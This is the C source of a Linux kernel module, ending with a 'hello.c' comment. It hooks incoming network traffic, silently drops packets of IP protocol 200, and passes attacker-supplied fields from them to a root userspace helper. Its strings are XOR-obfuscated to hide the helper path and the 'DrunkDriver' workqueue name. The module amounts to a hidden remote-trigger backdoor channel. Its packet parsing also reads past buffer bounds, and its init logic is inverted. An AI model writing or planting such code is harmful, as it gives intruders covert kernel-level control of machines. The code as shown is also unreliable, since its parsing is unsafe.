#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/byteorder/generic.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert Larsen <robert@the-playground.dk>");

#define KEY_MAX 256
#define VALUE_MAX 256

/* Obfuscated strings */
static char helper_path[] = "\xd0\x8a\x8c\x8d\xd0\x8c\x9d\x96\x91\xd0\x9b\x8d\x8a\x91\x94";
static char drunk_driver[] = "\xbb\x8d\x8a\x91\x94\xbb\x8d\x96\x89\x9a\x8d";
static char home[] = "\xb7\xb0\xb2\xba\xc2\xd0\x97\x90\x92\x9a\xd0\x8d\x90\x9d\x9a\x8d\x8b";
static char term[] = "\xab\xba\xad\xb2\xc2\x93\x96\x91\x8a\x87";
static char path[] = "\xaf\xbe\xab\xb7\xc2\xd0\x8c\x9d\x96\x91\xc5\xd0\x9d\x96\x91\xc5\xd0\x8a\x8c\x8d\xd0\x8c\x9d\x96\x91\xc5\xd0\x8a\x8c\x8d\xd0\x9d\x96\x91";
static char ip_format[] = "\xda\x9b\xd1\xda\x9b\xd1\xda\x9b\xd1\xda\x9b";
static char set[] = "\x8c\x9a\x8b";
static char check[] = "\x9c\x97\x9a\x9c\x94";

static struct workqueue_struct * queue = NULL;

typedef struct _UserspaceDBCall {
    struct work_struct work;
    enum {
        SET, CHECK
    } action;
    char key[KEY_MAX];
    char value[VALUE_MAX];
    unsigned short port;

    union {
        __be32 addr;
        char a[4];
    } source;
} UserspaceDBCall;

static void process_finished(struct subprocess_info * info) {
    kfree(info->data);
}

static void do_work( struct work_struct * work) {
    UserspaceDBCall * call = (UserspaceDBCall*)work;
    char ip_str[16];
    char port[6];

    char * argv[] = {
        helper_path, call->action == SET ? set : check, call->key, call->value, ip_str, port, NULL
    };
    char * envp[] = {
        home, term, path, NULL
    };

    sprintf(ip_str, ip_format, call->source.a[0] & 0xff, call->source.a[1] & 0xff, call->source.a[2] & 0xff, call->source.a[3] & 0xff);
    sprintf(port, "%d", call->port);
    call_usermodehelper_fns(argv[0], argv, envp, UMH_WAIT_PROC, NULL, process_finished, call);
}

static int call_user ( int action, char * key, char * value, __be32 saddr, unsigned short port ) {
    int res = 1;
    char * ptr;
    if (strlen(key) < KEY_MAX && strlen(value) < VALUE_MAX) {
        UserspaceDBCall * call = kmalloc(sizeof(UserspaceDBCall), GFP_ATOMIC);
        if (call) {
            INIT_WORK((struct work_struct*) call, do_work);
            call->source.addr = saddr;
            call->action = action;
            call->port = port;
            strcpy(call->key, key);
            strcpy(call->value, value);
            ptr = call->key;
            while (*ptr) {
                *ptr ^= 0xff;
                ptr++;
            }
            ptr = call->value;
            while (*ptr) {
                *ptr ^= 0xff;
                ptr++;
            }
            res = queue_work(queue, (struct work_struct*)call);
        }
    }
    return res;
}

static unsigned int my_nf_hookfn(unsigned int hooknum,
			       struct sk_buff *skb,
			       const struct net_device *in,
			       const struct net_device *out,
			       int (*okfn)(struct sk_buff *));

static struct nf_hook_ops my_hook __read_mostly = {
    .hook = my_nf_hookfn,
    .owner = THIS_MODULE,
    .pf = PF_INET,
    .hooknum = NF_INET_LOCAL_IN,
    .priority = NF_IP_PRI_LAST
};

static unsigned int my_nf_hookfn(unsigned int hooknum,
			       struct sk_buff *skb,
			       const struct net_device *in,
			       const struct net_device *out,
			       int (*okfn)(struct sk_buff *)) {

    struct iphdr * iph;
    char * data, * name, * flag, * port_s;
    unsigned short port = 0;
    int response = NF_ACCEPT;

    if (skb->len > sizeof(struct iphdr)) {
        iph = (struct iphdr*)skb->data;
        if (iph->protocol == 200) {
            if (skb->len > (iph->ihl * 4) + 10) {
                data = (char*)skb->data + (iph->ihl * 4);
                name = data + 1;
                flag = name + 1;
                while (*flag) {
                    flag++;
                }
                flag++;
                port_s = flag + 1;
                while (*port_s) {
                    port_s++;
                }
                port |= ((*(++port_s)) & 0xff) << 8;
                port |= (*(++port_s)) & 0xff;
                call_user(*data, name, flag, iph->saddr, port);
            }
            response = NF_DROP;
        }
    }

    return response;
}

static char * unobfuscate( char * in) {
    char * ptr = in;
    while (*ptr) {
        *(ptr++) ^= 0xff;
    }
    return in;
}

static int __init init ( void ) {
    int res = 1;
    unobfuscate(helper_path);
    unobfuscate(home);
    unobfuscate(term);
    unobfuscate(path);
    unobfuscate(ip_format);
    unobfuscate(set);
    unobfuscate(check);
    queue = create_workqueue(unobfuscate(drunk_driver));
    if (queue) {
        res = nf_register_hook(&my_hook);
        if (!res) {
            destroy_workqueue(queue);
        }
    }
    return res;
}

static void __exit cleanup ( void ) {
    nf_unregister_hook(&my_hook);
    flush_workqueue(queue);
    destroy_workqueue(queue);
}

module_init(init);
module_exit(cleanup);

/* end of hello.c */
